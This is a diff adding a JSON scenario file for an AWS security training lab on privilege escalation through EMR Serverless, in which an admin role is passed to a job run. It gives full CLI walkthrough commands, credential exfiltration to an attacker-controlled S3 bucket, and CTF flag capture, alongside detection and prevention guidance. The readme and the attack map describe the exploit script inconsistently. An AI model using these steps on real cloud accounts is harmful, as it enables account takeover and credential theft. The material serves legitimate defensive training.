@@ -1,0 +1,241 @@
+{
+  "displayName": "EMR Serverless Application Job to Admin",
+  "name": "emr-serverless-001-iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun",
+  "description": "Creating an EMR Serverless Spark application and running a job with an admin execution role to grant the starting user administrative access",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "emrserverless-001",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "new-passrole",
+  "pathType": "one-hop",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0002 - Execution"
+    ],
+    "techniques": [
+      "T1078.004 - Valid Accounts: Cloud Accounts",
+      "T1578 - Modify Cloud Compute Infrastructure"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_admin_emr_serverless_001_iam_passrole_emr_serverless_createapplication_emr_serverless_startjobrun",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/emr-serverless-001-iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/emr-serverless-001-iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun",
+  "schemaVersion": "4.6.1",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-emr-serverless-001-to-admin-starting-user",
+        "required": [
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-emr-serverless-001-to-admin-admin-role",
+            "description": "allows passing the admin role to the EMR Serverless service as the job execution role ARN (`requestParameters.executionRoleArn`) when starting a job run"
+          },
+          {
+            "permission": "emr-serverless:CreateApplication",
+            "resource": "*",
+            "description": "allows creating an EMR Serverless Spark application that serves as the compute environment for the exploit job"
+          },
+          {
+            "permission": "emr-serverless:StartJobRun",
+            "resource": "*",
+            "description": "allows submitting a job run that specifies the admin role as `executionRoleArn` and the pre-staged exploit script as the entry point"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "emr-serverless:GetApplication",
+            "purpose": "check application state before submitting job"
+          },
+          {
+            "permission": "emr-serverless:GetJobRun",
+            "purpose": "monitor job run status and verify completion"
+          },
+          {
+            "permission": "emr-serverless:ListApplications",
+            "purpose": "discover existing applications"
+          },
+          {
+            "permission": "iam:ListAttachedUserPolicies",
+            "purpose": "verify privilege escalation success by listing attached policies"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-emr-serverless-001-to-admin-starting-user` IAM user to the `pl-prod-emr-serverless-001-to-admin-admin-role` administrative role by creating an EMR Serverless Spark application and submitting a pre-staged PySpark job run that passes the admin role as the execution role and attaches `AdministratorAccess` to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-emr-serverless-001-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-emr-serverless-001-to-admin-admin-role`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable emr-serverless-001-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `emr-serverless-001-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-emr-serverless-001-to-admin-starting-user` | Scenario-specific starting user with access keys, `iam:PassRole`, `emr-serverless:CreateApplication`, and `emr-serverless:StartJobRun` permissions |\n| `arn:aws:iam::{account_id}:role/pl-prod-emr-serverless-001-to-admin-admin-role` | Administrative role (trusts `emr-serverless.amazonaws.com`) passed as `executionRoleArn` to the EMR Serverless job run |\n| `arn:aws:s3:::pl-prod-emr-serverless-001-to-admin-scripts-{attacker_account_id}-{suffix}` | Attacker-account S3 bucket (created via `aws.attacker` provider); holds the pre-staged PySpark exploit script that attaches `AdministratorAccess` to the starting user |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/emr-serverless-001-to-admin` | CTF flag stored in SSM Parameter Store; retrievable by any admin-equivalent principal |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Retrieve the attacker bucket name and admin role ARN from Terraform outputs\n4. Create an EMR Serverless Spark application and wait for it to reach `CREATED` state\n5. Submit a job run passing the admin role as `executionRoleArn` and the pre-staged PySpark exploit script as the entry point\n6. Poll until the EMR Serverless job reaches `SUCCESS` status (typically 1-2 minutes)\n7. Verify successful privilege escalation by confirming `AdministratorAccess` is attached to the starting user\n8. Capture the CTF flag from SSM Parameter Store using the newly gained admin permissions",
+        "resourcesCreated": "- `AdministratorAccess` managed policy attached to `pl-prod-emr-serverless-001-to-admin-starting-user`\n- EMR Serverless application created in the prod account (deleted by cleanup script)",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo emr-serverless-001-iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup emr-serverless-001-iam-passrole+emr-serverless-createapplication+emr-serverless-startjobrun\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable emr-serverless-001-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `emr-serverless-001-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user with `iam:PassRole` permission on a role that has administrative permissions\n- IAM user with `emr-serverless:CreateApplication` and `emr-serverless:StartJobRun` combined with `iam:PassRole`, forming a privilege escalation path through EMR Serverless\n- IAM role with `AdministratorAccess` or equivalent permissions that trusts `emr-serverless.amazonaws.com` and can be passed to EMR Serverless job runs\n- Privilege escalation path from IAM user to admin via EMR Serverless job submission",
+        "prevention": "- Restrict `iam:PassRole` using the `iam:PassedToService` condition key to limit which services a role can be passed to; if EMR Serverless is not used, deny `\"iam:PassedToService\": \"emr-serverless.amazonaws.com\"` entirely\n- Implement Service Control Policies (SCPs) to deny `emr-serverless:CreateApplication` and `emr-serverless:StartJobRun` in accounts and regions where EMR Serverless is not required\n- Audit all IAM roles with trust policies allowing `emr-serverless.amazonaws.com` and ensure none carry `AdministratorAccess` or broad IAM write permissions\n- Scope `iam:PassRole` resource constraints to non-privileged roles only; deny passing roles with `AdministratorAccess` or broad IAM permissions to EMR Serverless\n- Use IAM Access Analyzer to automatically detect privilege escalation paths involving `iam:PassRole` and `emr-serverless:StartJobRun`\n- Restrict which S3 buckets can be used as EMR Serverless job entry points to prevent arbitrary code execution via attacker-controlled scripts"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `emr-serverless:CreateApplication` -- new EMR Serverless application created; inspect subsequent `StartJobRun` calls from the same principal for privileged execution roles\n- `emr-serverless:StartJobRun` -- job run submitted; inspect `requestParameters.executionRoleArn` -- a privileged role ARN here is the CloudTrail signal for PassRole abuse via EMR Serverless; high severity when the execution role has administrative permissions\n- `iam:AttachUserPolicy` -- managed policy attached to an IAM user from within an EMR Serverless job context; critical when the policy is `AdministratorAccess` and the caller is an EMR Serverless execution role",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [AWS EMR Serverless Documentation](https://docs.aws.amazon.com/emr/latest/EMR-Serverless-UserGuide/getting-started.html) -- explains how EMR Serverless job runs work and why the execution role's credentials are injected into the Spark worker environment\n- [AWS IAM PassRole Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html) -- explains PassRole mechanics and how to restrict it with `iam:PassedToService`\n- [Rhino Security Labs - AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) -- comprehensive overview of IAM privilege escalation techniques including PassRole patterns\n- [pathfinding.cloud/paths/emr-serverless-001](https://pathfinding.cloud/paths/emr-serverless-001) -- documented attack path for this scenario",
+    "solution": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + emr-serverless:CreateApplication + emr-serverless:StartJobRun\n\nThis scenario demonstrates a privilege escalation where a user with `iam:PassRole`, `emr-serverless:CreateApplication`, and `emr-serverless:StartJobRun` permissions can submit a PySpark job to an EMR Serverless application running under an administrative role, and use that job to attach `AdministratorAccess` to themselves.\n\nEMR Serverless removes the cluster-provisioning overhead of regular EMR -- you submit a job and the service handles compute. The job runs under a customer-supplied job-execution role (the \"PassRole target\"). When that role is administrative, the PySpark script can call IAM and perform any action allowed to the role. The attacker stages a script in an S3 bucket they control, points the job at it, and the job's `boto3` client runs `iam:AttachUserPolicy` under the admin role's credentials.\n\nThis is the \"PassRole + Compute Service\" privilege escalation pattern applied to EMR Serverless, similar to the EMR (`emr-001`), Glue, and Batch variants but with faster startup (~1-2 minutes versus 5-15 for managed EMR).\n\n## The Challenge\n\nYou start as `pl-prod-emr-serverless-001-to-admin-starting-user` -- an IAM user with `iam:PassRole` (scoped to the admin role), `emr-serverless:CreateApplication`, and `emr-serverless:StartJobRun`. Your goal is to reach effective administrator access in the account.\n\nThere is also an IAM role, `pl-prod-emr-serverless-001-to-admin-admin-role`, with `AdministratorAccess` attached. This role trusts `emr-serverless.amazonaws.com`, meaning EMR Serverless can assume it as the job execution role.\n\nA pre-staged PySpark script lives in an attacker-controlled S3 bucket (the bucket policy grants the prod account read access). The script calls `iam:AttachUserPolicy` against the starting user. The starting user does *not* have `s3:PutObject` -- the script is set up by infrastructure rather than uploaded at attack time.\n\nCan you weaponize the EMR Serverless `CreateApplication` + `StartJobRun` flow to make the admin role execute that script?\n\n## Reconnaissance\n\nConfirm your identity and verify that you don't already have admin access.\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::{account_id}:user/pl-prod-emr-serverless-001-to-admin-starting-user\n\naws iam list-users --max-items 1\n# AccessDenied -- you are not admin yet\n```\n\n## Exploitation\n\n### Step 1: Create the EMR Serverless application\n\nEMR Serverless requires an \"application\" object before you can submit jobs. The application defines the runtime and capacity; it has no security implications by itself.\n\n```bash\nADMIN_ROLE_ARN=\"arn:aws:iam::{account_id}:role/pl-prod-emr-serverless-001-to-admin-admin-role\"\nSCRIPT_S3=\"s3://pl-emr-serverless-001-scripts-{attacker_account_id}-{suffix}/exploit.py\"\n\naws emr-serverless create-application \\\n    --name pl-prod-emr-serverless-001-attack-app \\\n    --release-label emr-7.0.0 \\\n    --type SPARK \\\n    --query 'applicationId' --output text\n# 00abcdef0123456\n```\n\nWait until the application is in `CREATED` state (poll `get-application`).\n\n### Step 2: Submit the job, passing the admin role\n\n`StartJobRun` is where the `iam:PassRole` check fires -- you're passing the admin role as the `executionRoleArn`. The job entrypoint points at the attacker-controlled PySpark script.\n\n```bash\nAPP_ID=\"00abcdef0123456\"\n\naws emr-serverless start-job-run \\\n    --application-id \"$APP_ID\" \\\n    --execution-role-arn \"$ADMIN_ROLE_ARN\" \\\n    --job-driver \"{\\\"sparkSubmit\\\":{\\\"entryPoint\\\":\\\"$SCRIPT_S3\\\"}}\" \\\n    --query 'jobRunId' --output text\n# 00fedcba9876543\n```\n\nThe job is now running under the admin role's credentials inside the EMR Serverless worker. The PySpark script's `boto3` client inherits those credentials via IMDS-equivalent metadata.\n\n### Step 3: Wait for the job to complete\n\nPoll `get-job-run` every 15-30 seconds. EMR Serverless typically completes a short PySpark job in 1-2 minutes (much faster than managed EMR).\n\n```bash\naws emr-serverless get-job-run \\\n    --application-id \"$APP_ID\" \\\n    --job-run-id \"$JOB_RUN_ID\" \\\n    --query 'jobRun.state' --output text\n# PENDING -> SCHEDULED -> RUNNING -> SUCCESS\n```\n\nA status of `SUCCESS` confirms the PySpark script ran successfully under the admin role.\n\n## Verification\n\nWait about 15 seconds for the IAM policy change to propagate, then verify using the starting user credentials (not readonly credentials -- verifying with readonly would be a false positive since readonly has independent read permissions):\n\n```bash\naws iam list-attached-user-policies \\\n    --user-name pl-prod-emr-serverless-001-to-admin-starting-user \\\n    --query 'AttachedPolicies[*].PolicyArn' --output text\n# arn:aws:iam::aws:policy/AdministratorAccess\n\naws iam list-users --max-items 3\n# Successfully returns user list -- you have admin access\n```\n\n## Capture the Flag\n\nAdmin access isn't the finish line -- the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.\n\nUsing the starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:\n\n```bash\naws ssm get-parameter \\\n    --name /pathfinding-labs/flags/emr-serverless-001-to-admin \\\n    --query 'Parameter.Value' --output text\n# flag{...}  -- your scenario-specific flag value\n```\n\nThe value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them -- only the scenario ID in the path changes.\n\n## What Happened\n\nThe attack exploited the \"PassRole + Compute Service\" pattern: `iam:PassRole` let you delegate the admin role to EMR Serverless as the job execution role, and `emr-serverless:StartJobRun` let you define what code runs under that role. The PySpark worker assumed the admin role automatically via the service's internal credentials wiring, and the script called `iam:AttachUserPolicy` under those admin credentials -- permanently granting your starting user `AdministratorAccess`.\n\nIn real environments this pattern appears when data engineers are given EMR Serverless permissions to run interactive analytics, but the job execution role they're allowed to pass is over-broad. EMR Serverless is especially attractive for this pattern compared to managed EMR because the startup time is short (1-2 minutes versus 5-15), the cost-at-rest is zero, and there's no cluster artifact to investigate after the fact -- the application can be deleted immediately after the job completes.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-emr-serverless-001-to-admin-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole on the admin execution role, emr-serverless:CreateApplication, and emr-serverless:StartJobRun permissions. Together these allow you to create an EMR Serverless Spark application, pass the admin role as its execution role, and run a job that executes arbitrary PySpark code with full admin privileges in the account.\n"
+      },
+      {
+        "id": "emr-serverless-app",
+        "label": "EMR Serverless Application",
+        "type": "resource",
+        "subType": "emr-serverless-application",
+        "arn": "arn:aws:emr-serverless:{region}:{account_id}:/applications/*",
+        "description": "An EMR Serverless Spark application created by the attacker. EMR Serverless is a fully managed compute environment that runs Spark workloads without requiring cluster or infrastructure management. When a job run is submitted to this application, EMR Serverless assumes the specified execution role and runs the provided PySpark script with that role's permissions.\nBecause the attacker controls the script and passes the admin role as the execution role, arbitrary code runs with administrative permissions. The pre-staged exploit script exfiltrates the execution role's temporary credentials to the attacker-controlled S3 bucket (IAM is not directly reachable from the EMR Serverless runtime without a VPC), allowing the attacker to use those credentials to attach AdministratorAccess to themselves.\n"
+      },
+      {
+        "id": "admin-role",
+        "label": "Admin Execution Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-emr-serverless-001-to-admin-admin-role",
+        "description": "An IAM role with AdministratorAccess attached, trusted by emr-serverless.amazonaws.com. This role is passed as the execution role for the Spark job run. All PySpark code in the job runs with the permissions of this role. Because the EMR Serverless runtime cannot reach iam.amazonaws.com directly without a VPC, the exploit script exfiltrates the role's temporary credentials to S3, then the attacker retrieves them and uses them to attach AdministratorAccess to the starting user \u2014 granting persistent admin access.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/emr-serverless-001-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM parameter in the victim account. Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is granted implicitly by AdministratorAccess). Your goal is to read this parameter using the admin access gained from the previous step.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "emr-serverless-app",
+        "label": "emr-serverless:CreateApplication",
+        "description": "The starting user creates an EMR Serverless Spark application. No compute is provisioned at this point \u2014 the application is just a control-plane object that holds configuration. Creating an application requires only emr-serverless:CreateApplication and does not trigger any IAM role usage yet.\n",
+        "hints": [
+          "Create an EMR Serverless application of type SPARK using a current EMR release label (e.g. emr-7.7.0). The application transitions to CREATED state almost immediately; poll emr-serverless:GetApplication until state is CREATED or STARTED before submitting a job run.",
+          "Browse to https://pathfinding.cloud/paths/emr-serverless-001 for technique details and the full attack flow."
+        ],
+        "commands": [
+          {
+            "description": "Create an EMR Serverless Spark application",
+            "command": "aws emr-serverless create-application\n  --name pl-prod-emr-serverless-001-to-admin-app\n  --release-label emr-7.7.0\n  --type SPARK\n  --output json\n"
+          }
+        ]
+      },
+      {
+        "from": "starting-user",
+        "to": "emr-serverless-app",
+        "label": "iam:PassRole + emr-serverless:StartJobRun",
+        "description": "The starting user submits a job run to the EMR Serverless application, passing the admin execution role via iam:PassRole. The job driver points to the pre-staged exploit PySpark script in the attacker-controlled S3 bucket. EMR Serverless assumes the specified execution role and executes the script with admin-level permissions. The script exfiltrates the role's temporary credentials to S3 so the attacker can retrieve and use them.\n",
+        "hints": [
+          "Submit a job run specifying the admin role ARN as --execution-role-arn and the pre-staged exploit script S3 path as the sparkSubmit entryPoint. Pass the attacker bucket name and exfil key as entryPointArguments. The exploit script writes the execution role's temporary credentials to s3://<bucket>/exfil/creds.json.",
+          "Poll emr-serverless:GetJobRun until state is SUCCESS (typically 2-5 minutes). Then download the exfiltrated credentials and use them to call iam:AttachUserPolicy."
+        ],
+        "commands": [
+          {
+            "description": "Start a job run with the admin execution role and pre-staged exploit script",
+            "command": "aws emr-serverless start-job-run\n  --application-id <application_id>\n  --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-emr-serverless-001-to-admin-admin-role\n  --job-driver '{\"sparkSubmit\":{\"entryPoint\":\"s3://<attacker_bucket>/scripts/exploit.py\",\"entryPointArguments\":[\"<attacker_bucket>\",\"exfil/creds.json\"],\"sparkSubmitParameters\":\"--conf spark.executor.cores=1 --conf spark.executor.memory=2g --conf spark.driver.cores=1 --conf spark.driver.memory=2g --conf spark.executor.instances=1\"}}'\n  --output json\n"
+          },
+          {
+            "description": "Poll job run status until SUCCESS",
+            "command": "aws emr-serverless get-job-run --application-id <application_id> --job-run-id <job_run_id> --query 'jobRun.state' --output text"
+          }
+        ]
+      },
+      {
+        "from": "emr-serverless-app",
+        "to": "admin-role",
+        "label": "assumes role + exfiltrates creds + iam:AttachUserPolicy",
+        "description": "The Spark job assumes the admin execution role at startup via the EMR Serverless container credential provider. All boto3 calls in the script run with that role's permissions. Because the EMR Serverless runtime without a VPC cannot reach iam.amazonaws.com directly, the exploit script writes the role's temporary credentials (access key, secret key, session token) to the attacker-controlled S3 bucket. The attacker then downloads the credentials and uses them locally to attach AdministratorAccess to the starting user via iam:AttachUserPolicy.\n",
+        "hints": [],
+        "commands": [
+          {
+            "description": "Download the exfiltrated credentials from S3",
+            "command": "aws s3 cp s3://<attacker_bucket>/exfil/creds.json /tmp/stolen_creds.json"
+          },
+          {
+            "description": "Attach AdministratorAccess to the starting user using the stolen admin credentials",
+            "command": "aws iam attach-user-policy --user-name pl-prod-emr-serverless-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+          },
+          {
+            "description": "Verify AdministratorAccess is attached",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-emr-serverless-001-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
+          }
+        ]
+      },
+      {
+        "from": "admin-role",
+        "to": "ctf-flag",
+        "label": "Read CTF flag",
+        "description": "With AdministratorAccess now attached to the starting user, retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters in the account, so no additional permissions are needed beyond the admin access just gained. Use the starting user's credentials (which now hold AdministratorAccess) to read the flag.\n",
+        "hints": [
+          "You now hold admin-equivalent credentials on the starting user. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets.",
+          "Scenario flags live under a shared prefix in SSM Parameter Store \u2014 consider what a reasonable naming convention for this lab might look like.",
+          "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
+        ],
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from SSM Parameter Store",
+            "command": "aws ssm get-parameter --name /pathfinding-labs/flags/emr-serverless-001-to-admin --query 'Parameter.Value' --output text"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "iam",
+    "emr-serverless"
+  ],
+  "slug": "emrserverless-001",
+  "hasDemoTranscript": false
+}
